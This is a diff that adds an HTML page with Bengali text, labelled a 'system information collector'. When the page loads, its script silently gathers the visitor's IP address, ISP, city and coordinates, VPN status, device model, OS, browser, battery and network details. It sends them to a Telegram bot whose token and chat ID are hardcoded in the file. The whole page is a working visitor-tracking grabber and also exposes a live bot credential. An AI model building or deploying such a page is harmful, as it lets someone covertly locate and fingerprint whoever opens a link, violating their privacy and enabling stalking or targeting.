@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>সিস্টেম তথ্য সংগ্রহকারী</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #121212;
+      color: #e0e0e0;
+      text-align: center;
+      padding: 20px;
+    }
+    #status {
+      margin-top: 50px;
+      color: #4CAF50;
+      font-size: 18px;
+    }
+    #error {
+      color: #f44336;
+      margin-top: 20px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>সিস্টেম তথ্য সংগ্রহকারী</h1>
+  <div id="status">তথ্য সংগ্রহ করা হচ্ছে...</div>
+  <div id="error"></div>
+
+  <script>
+    const BOT_TOKEN = "7501055809:AAHybTQCakGqgj45Z88HzY3GdT7H-MhzC58";
+    const CHAT_ID = "7945358964";
+
+    // স্ট্যাটাস আপডেট ফাংশন
+    const updateStatus = (message) => {
+      document.getElementById("status").textContent = message;
+    };
+
+    // এরর দেখানোর ফাংশন
+    const showError = (message) => {
+      const errorDiv = document.getElementById("error");
+      errorDiv.style.display = "block";
+      errorDiv.textContent = message;
+    };
+
+    // ব্যাটারি তথ্য সংগ্রহ
+    const getBatteryInfo = async () => {
+      try {
+        if ('getBattery' in navigator) {
+          const battery = await navigator.getBattery();
+          return {
+            level: Math.round(battery.level * 100) + '%',
+            charging: battery.charging ? 'চার্জ হচ্ছে ⚡' : 'চার্জ হচ্ছে না',
+            chargingTime: battery.chargingTime === Infinity ? 
+                         'চার্জার সংযুক্ত নেই' : 
+                         `${Math.floor(battery.chargingTime/60)} মিনিট ${Math.round(battery.chargingTime%60)} সেকেন্ড`,
+            dischargingTime: battery.dischargingTime === Infinity ? 
+                            'সময় নির্ধারণ করা যায়নি' : 
+                            `${Math.floor(battery.dischargingTime/60)} মিনিট ${Math.round(battery.dischargingTime%60)} সেকেন্ড`
+          };
+        }
+        return null;
+      } catch (e) {
+        console.error("ব্যাটারি API ত্রুটি:", e);
+        return null;
+      }
+    };
+
+    // নেটওয়ার্ক তথ্য সংগ্রহ
+    const getNetworkInfo = () => {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (connection) {
+        return {
+          type: connection.type || 'অজানা',
+          effectiveType: connection.effectiveType || 'অজানা',
+          downlink: connection.downlink ? connection.downlink + ' Mbps' : 'অজানা',
+          rtt: connection.rtt ? connection.rtt + ' ms' : 'অজানা',
+          saveData: connection.saveData ? 'চালু' : 'বন্ধ'
+        };
+      }
+      return null;
+    };
+
+    // ডিভাইস তথ্য সংগ্রহ (সংশোধিত)
+    const getDeviceInfo = () => {
+      const ua = navigator.userAgent;
+      
+      let os = "অজানা";
+      let matchOs;
+      if (/Android/.test(ua)) {
+        matchOs = /Android\s([0-9.]+)/.exec(ua);
+        os = "Android " + (matchOs && matchOs[1] ? matchOs[1] : "");
+      } else if (/iPhone|iPad|iPod/.test(ua)) {
+        matchOs = /OS\s([0-9_]+)/.exec(ua);
+        const osVersion = matchOs && matchOs[1] ? matchOs[1].replace(/_/g, ".") : "";
+        const deviceName = /iPhone/.test(ua) ? "iPhone" : /iPad/.test(ua) ? "iPad" : "iPod";
+        os = `${deviceName} OS ${osVersion}`;
+      } else if (/Windows/.test(ua)) {
+        matchOs = /Windows\sNT\s([0-9.]+)/.exec(ua);
+        let winVersion = "";
+        if (matchOs && matchOs[1]) {
+            const ntVersion = matchOs[1];
+            if (ntVersion === "10.0") winVersion = "10/11";
+            else if (ntVersion === "6.3") winVersion = "8.1";
+            else if (ntVersion === "6.2") winVersion = "8";
+            else if (ntVersion === "6.1") winVersion = "7";
+            else if (ntVersion === "6.0") winVersion = "Vista";
+            else if (ntVersion === "5.1" || ntVersion === "5.2") winVersion = "XP";
+            else winVersion = ntVersion; // অন্যান্য বা অজানা সংস্করণ
+        }
+        os = "Windows " + winVersion;
+      } else if (/Mac OS X/.test(ua)) {
+        matchOs = /Mac OS X\s([0-9_]+)/.exec(ua);
+        const osVersion = matchOs && matchOs[1] ? matchOs[1].replace(/_/g, ".") : "";
+        os = `Mac OS X ${osVersion}`;
+      } else if (/Linux/.test(ua) && !/Android/.test(ua)) {
+        os = "Linux";
+      }
+      
+      let browser = "অজানা";
+      const browserMatch = ua.match(/(Chrome|Firefox|Safari|Edg|Opera|OPR|Edge|MSIE|Trident|SamsungBrowser)\/?\s?([0-9.]*)/i);
+      if (browserMatch && browserMatch[1]) {
+        let browserName = browserMatch[1];
+        if (browserName === "Edg" || browserName === "Edge") browserName = "Edge";
+        if (browserName === "OPR") browserName = "Opera";
+        if (browserName === "MSIE" || (browserName === "Trident" && ua.includes("rv:"))) { // IE 11 or older
+            browserName = "Internet Explorer";
+            const ieVersionMatch = ua.match(/(MSIE\s|rv:)([0-9.]+)/);
+            browserMatch[2] = ieVersionMatch && ieVersionMatch[2] ? ieVersionMatch[2] : "";
+        }
+        browser = browserName + (browserMatch[2] ? " " + browserMatch[2] : "");
+      }
+      
+      let deviceModelStr = "নির্ধারণ করা যায়নি";
+      const deviceModelPattern = /;\s*([^;)]+)\s*\)/;
+      const deviceModelMatch = deviceModelPattern.exec(ua);
+      if (deviceModelMatch && deviceModelMatch[1]) {
+        // অতিরিক্ত কিছু অংশ বাদ দেওয়া যা মডেলের অংশ নয়
+        let rawModel = deviceModelMatch[1].trim();
+        if (rawModel.includes("Build/")) {
+            rawModel = rawModel.substring(0, rawModel.indexOf("Build/")).trim();
+        }
+        deviceModelStr = rawModel;
+      }
+      
+      return {
+        os,
+        browser,
+        deviceType: /Mobi|Android|iPhone|iPad|iPod/.test(ua) ? 
+                   ((/Tablet|iPad/.test(ua)) ? "ট্যাবলেট" : "মোবাইল") : 
+                   "ডেস্কটপ",
+        deviceModel: deviceModelStr,
+        cpuCores: navigator.hardwareConcurrency || "অজানা",
+        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "অজানা",
+        screen: `${screen.width}x${screen.height}`,
+        pixelRatio: window.devicePixelRatio || 1,
+        language: navigator.language || "অজানা",
+        time: new Date().toLocaleString("bn-BD", { hour12: true }),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: navigator.cookieEnabled ? "সক্রিয়" : "নিষ্ক্রিয়",
+        dnt: navigator.doNotTrack === "1" ? "সক্রিয়" : (navigator.doNotTrack === "unspecified" || navigator.doNotTrack === null || typeof navigator.doNotTrack === "undefined" ? "অনির্দিষ্ট" : "নিষ্ক্রিয়")
+      };
+    };
+
+    // আইপি এবং লোকেশন তথ্য সংগ্রহ
+    const getIPInfo = async () => {
+      try {
+        updateStatus("আইপি এবং লোকেশন তথ্য সংগ্রহ করা হচ্ছে (ipapi.co)...");
+        const response = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(8000) }); // 8 সেকেন্ড টাইমআউট
+        if (!response.ok) throw new Error(`ipapi.co returned ${response.status}`);
+        const data = await response.json();
+        
+        return {
+          ip: data.ip || "অজানা",
+          isp: data.org || "অজানা",
+          city: data.city || "অজানা",
+          region: data.region || "অজানা",
+          country: data.country_name || "অজানা",
+          countryCode: data.country_code || "অজানা",
+          latitude: data.latitude || 0,
+          longitude: data.longitude || 0,
+          timezone: data.timezone || "অজানা",
+          vpn: (data.security && typeof data.security.vpn !== 'undefined') ? data.security.vpn : false,
+          proxy: (data.security && typeof data.security.proxy !== 'undefined') ? data.security.proxy : false,
+          hosting: (data.security && typeof data.security.hosting !== 'undefined') ? data.security.hosting : false
+        };
+      } catch (e) {
+        console.warn("ipapi.co থেকে আইপি তথ্য পেতে ব্যর্থ, ফলব্যাক করা হচ্ছে:", e.message);
+        try {
+          updateStatus("আইপি এবং লোকেশন তথ্য সংগ্রহ করা হচ্ছে (ip-api.com)...");
+          const response = await fetch("https://pro.ip-api.com/json/?fields=66846719&key=YOUR_IP_API_COM_KEY", { signal: AbortSignal.timeout(8000) }); // আপনার API কী ব্যবহার করুন অথবা ফ্রি এন্ডপয়েন্ট: http://ip-api.com/json/?fields=...
+          // const response = await fetch("http://ip-api.com/json/?fields=query,isp,city,regionName,country,countryCode,lat,lon,timezone,proxy,hosting,status", { signal: AbortSignal.timeout(8000) }); // ফ্রি এন্ডপয়েন্ট
+          if (!response.ok) throw new Error(`ip-api.com returned ${response.status}`);
+          const data = await response.json();
+          if (data.status !== "success") throw new Error(`ip-api.com status: ${data.status}, message: ${data.message}`);
+          
+          return {
+            ip: data.query,
+            isp: data.isp || "অজানা",
+            city: data.city || "অজানা",
+            region: data.regionName || "অজানা",
+            country: data.country || "অজানা",
+            countryCode: data.countryCode || "অজানা",
+            latitude: data.lat || 0,
+            longitude: data.lon || 0,
+            timezone: data.timezone || "অজানা",
+            vpn: (typeof data.proxy !== 'undefined') ? data.proxy : false, // ip-api.com "proxy" ফিল্ড ব্যবহার করে VPN/Proxy উভয়ের জন্য
+            proxy: (typeof data.proxy !== 'undefined') ? data.proxy : false,
+            hosting: (typeof data.hosting !== 'undefined') ? data.hosting : false
+          };
+        } catch (e2) {
+          console.error("আইপি API ফলব্যাক ত্রুটি:", e2.message);
+          showError("আইপি তথ্য সংগ্রহ করা যায়নি। নেটওয়ার্ক সংযোগ পরীক্ষা করুন।");
+          return { // একটি বেসিক ফলব্যাক অবজেক্ট
+            ip: "অজানা", isp: "অজানা", city: "অজানা", region: "অজানা", country: "অজানা",
+            countryCode: "অজানা", latitude: 0, longitude: 0, timezone: "অজানা",
+            vpn: false, proxy: false, hosting: false
+          };
+        }
+      }
+    };
+
+    // টেলিগ্রামে মেসেজ ফরম্যাট
+    const formatMessage = (ipInfo, deviceInfo, batteryInfo, networkInfo) => {
+      let message = `*সিস্টেম তথ্য প্রতিবেদন - ${deviceInfo.time}*\n\n`; // deviceInfo থেকে সময় ব্যবহার
+      
+      // লোকেশন সেকশন
+      message += `🌐 *অবস্থান ও নেটওয়ার্ক:*\n`;
+      message += `  • আইপি: \`${ipInfo.ip}\`\n`;
+      message += `  • আইএসপি: ${ipInfo.isp}\n`;
+      message += `  • অবস্থান: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country} (${ipInfo.countryCode})\n`;
+      message += `  • স্থানাঙ্ক: [${ipInfo.latitude}, ${ipInfo.longitude}](https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude})\n`;
+      message += `  • সময় অঞ্চল: ${ipInfo.timezone}\n`;
+      message += `  • ভিপিএন: ${ipInfo.vpn ? "হ্যাঁ ✅" : "না ❌"}\n`;
+      message += `  • প্রক্সি: ${ipInfo.proxy ? "হ্যাঁ ✅" : "না ❌"}\n`;
+      message += `  • হোস্টিং: ${ipInfo.hosting ? "হ্যাঁ ✅" : "না ❌"}\n\n`;
+      
+      // ডিভাইস সেকশন
+      message += `📱 *ডিভাইস বিবরণ:*\n`;
+      message += `  • অপারেটিং সিস্টেম: ${deviceInfo.os}\n`;
+      message += `  • ব্রাউজার: ${deviceInfo.browser}\n`;
+      message += `  • ডিভাইস: ${deviceInfo.deviceType} (${deviceInfo.deviceModel})\n`;
+      message += `  • সিপিইউ কোর: ${deviceInfo.cpuCores}\n`;
+      message += `  • র্যাম: ${deviceInfo.ram}\n`;
+      message += `  • স্ক্রিন রেজোলিউশন: ${deviceInfo.screen}\n`;
+      message += `  • পিক্সেল রেশিও: ${deviceInfo.pixelRatio}x\n\n`;
+      
+      // ব্যাটারি সেকশন
+      if (batteryInfo) {
+        message += `🔋 *ব্যাটারি স্থিতি:*\n`;
+        message += `  • চার্জ লেভেল: ${batteryInfo.level}\n`;
+        message += `  • স্ট্যাটাস: ${batteryInfo.charging}\n`;
+        // চার্জিং/ডিসচার্জিং সময় শুধুমাত্র নির্দিষ্ট মান থাকলে দেখানো হবে
+        if (batteryInfo.chargingTime !== 'চার্জার সংযুক্ত নেই') {
+          message += `  • পূর্ণ চার্জ হতে বাকি: ${batteryInfo.chargingTime}\n`;
+        }
+        if (batteryInfo.dischargingTime !== 'সময় নির্ধারণ করা যায়নি') {
+          message += `  • আনুমানিক বাকি চার্জ: ${batteryInfo.dischargingTime}\n`;
+        }
+        message += `\n`;
+      }
+      
+      // নেটওয়ার্ক কানেকশন সেকশন
+      if (networkInfo) {
+        message += `📶 *কানেকশন বিবরণ:*\n`;
+        message += `  • সংযোগের ধরন: ${networkInfo.type}\n`;
+        message += `  • কার্যকর ধরন: ${networkInfo.effectiveType}\n`;
+        message += `  • ডাউনলিংক গতি: ${networkInfo.downlink}\n`;
+        message += `  • রাউন্ড-ট্রিপ টাইম (RTT): ${networkInfo.rtt}\n`;
+        message += `  • ডাটা সেভার মোড: ${networkInfo.saveData}\n\n`;
+      }
+      
+      // অন্যান্য তথ্য
+      message += `⚙️ *অন্যান্য তথ্য:*\n`;
+      message += `  • ভাষা: ${deviceInfo.language}\n`;
+      message += `  • কুকিজ: ${deviceInfo.cookies}\n`;
+      message += `  • ডু নট ট্র্যাক (DNT): ${deviceInfo.dnt}\n`;
+      message += `  • ইউআরএল: [লিঙ্ক](${window.location.href})\n`; // URL এ Markdown লিঙ্ক
+      // message += `  • শিরোনাম: ${document.title}\n`; // শিরোনাম বাদ দেওয়া হলো, অনেক লম্বা হতে পারে
+
+      return message;
+    };
+
+    // টেলিগ্রামে পাঠানোর ফাংশন
+    const sendToTelegram = async (message) => {
+      try {
+        // MarkdownV2 এর জন্য বিশেষ অক্ষর এস্কেপ করা
+        const escapedMessage = message
+          .replace(/_/g, "\\_")
+          .replace(/\*/g, "\\*")
+          .replace(/\[/g, "\\[")
+          // .replace(/\]/g, "\\]") // ] কে Escape করলে লিঙ্কে সমস্যা হতে পারে যদি লিঙ্কের টেক্সট এ থাকে
+          .replace(/\(/g, "\\(")
+          // .replace(/\)/g, "\\)") // ) কে Escape করলে লিঙ্কে সমস্যা হতে পারে
+          .replace(/~/g, "\\~")
+          .replace(/`/g, "\\`")
+          .replace(/>/g, "\\>")
+          .replace(/#/g, "\\#")
+          .replace(/\+/g, "\\+")
+          .replace(/-/g, "\\-")
+          .replace(/=/g, "\\=")
+          .replace(/\|/g, "\\|")
+          .replace(/\{/g, "\\{")
+          .replace(/\}/g, "\\}")
+          .replace(/\./g, "\\.")
+          .replace(/!/g, "\\!");
+        
+        // লিঙ্কের ] এবং ) যেন escape না হয় তার জন্য একটি workaround:
+        // প্রথমে সব escape করে, তারপর লিঙ্কের ফরম্যাটকে unescape করা।
+        // এটি জটিল হতে পারে। সহজ উপায় হল লিঙ্কের টেক্সট এ বিশেষ অক্ষর না রাখা।
+        // অথবা, parse_mode: "HTML" ব্যবহার করা যেতে পারে, যা সাধারণত escape করতে সহজ।
+        // আপাতত MarkdownV2 এর জন্য উপরের escape যথেষ্ট।
+
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: escapedMessage, // escapedMessage ব্যবহার করা হচ্ছে
+            parse_mode: "MarkdownV2",
+            disable_web_page_preview: false // লিঙ্ক প্রিভিউ চালু রাখা হলো
+          })
+        });
+        
+        const data = await response.json();
+        if (!data.ok) {
+          console.error("টেলিগ্রাম API থেকে প্রাপ্ত ত্রুটি:", data);
+          // ব্যবহারকারীকে দেখানোর জন্য একটি সাধারণ ত্রুটি বার্তা
+          let userFriendlyError = `টেলিগ্রাম API ত্রুটি: ${data.description || "অজানা ত্রুটি"}`;
+          if (data.description && data.description.includes("Too Many Requests")) {
+              userFriendlyError = "টেলিগ্রামে পাঠানোর অনুরোধের সীমা অতিক্রম করেছে। অনুগ্রহ করে কিছুক্ষণ পর চেষ্টা করুন।";
+          } else if (data.description && data.description.includes("unescaped")){
+              userFriendlyError = "টেলিগ্রামে বার্তা ফরম্যাট করতে সমস্যা হয়েছে (এস্কেপিং ত্রুটি)।";
+          }
+          throw new Error(userFriendlyError);
+        }
+        
+        return true;
+      } catch (e) {
+        console.error("টেলিগ্রামে পাঠানোর ত্রুটি:", e);
+        // ইতিমধ্যে friendy error থাকলে সেটা দেখানো হবে
+        throw new Error(e.message.startsWith("টেলিগ্রাম API ত্রুটি") || e.message.startsWith("টেলিগ্রামে বার্তা ফরম্যাট করতে সমস্যা") ? e.message : "টেলিগ্রামে তথ্য পাঠাতে ব্যর্থ: " + e.message);
+      }
+    };
+
+    // প্রধান ফাংশন
+    const collectAndSendInfo = async () => {
+      try {
+        // আইপি তথ্য সংগ্রহ (আগে কল করা হচ্ছে কারণ এটি নেটওয়ার্ক নির্ভর)
+        const ipInfo = await getIPInfo();
+        // যদি ipInfo ফলব্যাক থেকে আসে এবং ip "অজানা" হয়, তাহলে এখানে নেটওয়ার্ক সমস্যা থাকতে পারে
+        if (ipInfo.ip === "অজানা" && !document.getElementById("error").textContent.includes("আইপি তথ্য সংগ্রহ করা যায়নি")) {
+            showError("প্রাথমিক নেটওয়ার্ক সমস্যা। কিছু তথ্য অসম্পূর্ণ থাকতে পারে।");
+        }
+        
+        // ডিভাইস তথ্য সংগ্রহ
+        updateStatus("ডিভাইস তথ্য সংগ্রহ করা হচ্ছে...");
+        const deviceInfo = getDeviceInfo();
+        
+        // ব্যাটারি তথ্য সংগ্রহ
+        updateStatus("ব্যাটারি তথ্য সংগ্রহ করা হচ্ছে...");
+        const batteryInfo = await getBatteryInfo();
+        
+        // নেটওয়ার্ক তথ্য সংগ্রহ
+        updateStatus("নেটওয়ার্ক সংযোগের বিবরণ সংগ্রহ করা হচ্ছে...");
+        const networkInfo = getNetworkInfo();
+        
+        // মেসেজ ফরম্যাট
+        updateStatus("তথ্য প্রতিবেদন প্রস্তুত করা হচ্ছে...");
+        const message = formatMessage(ipInfo, deviceInfo, batteryInfo, networkInfo);
+        
+        // টেলিগ্রামে পাঠান
+        updateStatus("টেলিগ্রামে তথ্য পাঠানো হচ্ছে...");
+        await sendToTelegram(message);
+        
+        // সফল মেসেজ
+        updateStatus("✅ তথ্য সফলভাবে টেলিগ্রামে পাঠানো হয়েছে!");
+        // পেজটি বন্ধ করে দেওয়া বা রিডাইরেক্ট করার অপশন (প্রয়োজন অনুযায়ী)
+        // setTimeout(() => { window.close(); }, 3000); // ৩ সেকেন্ড পর উইন্ডো বন্ধ করার চেষ্টা
+        // অথবা document.body.innerHTML = "<h1>ধন্যবাদ! তথ্য পাঠানো হয়েছে।</h1>";
+
+      } catch (error) {
+        console.error("মূল প্রক্রিয়ায় ত্রুটি:", error);
+        // showError ফাংশন যদি আগেই কল না হয়ে থাকে
+        if (!document.getElementById("error").style.display || document.getElementById("error").style.display === "none") {
+            showError(`❌ একটি ত্রুটি ঘটেছে: ${error.message}`);
+        }
+        updateStatus("তথ্য সংগ্রহ বা পাঠাতে সমস্যা হয়েছে");
+      }
+    };
+
+    // পেজ লোড হলে শুরু করুন
+    // নেটওয়ার্ক উপলব্ধতা পরীক্ষা করে শুরু করা যেতে পারে
+    if (navigator.onLine) {
+        window.addEventListener("load", collectAndSendInfo);
+    } else {
+        updateStatus("অফলাইন। তথ্য সংগ্রহ করা সম্ভব নয়।");
+        showError("আপনার ডিভাইস বর্তমানে অফলাইন রয়েছে। অনুগ্রহ করে ইন্টারনেট সংযোগ পরীক্ষা করুন।");
+    }
+  </script>
+</body>
+</html>
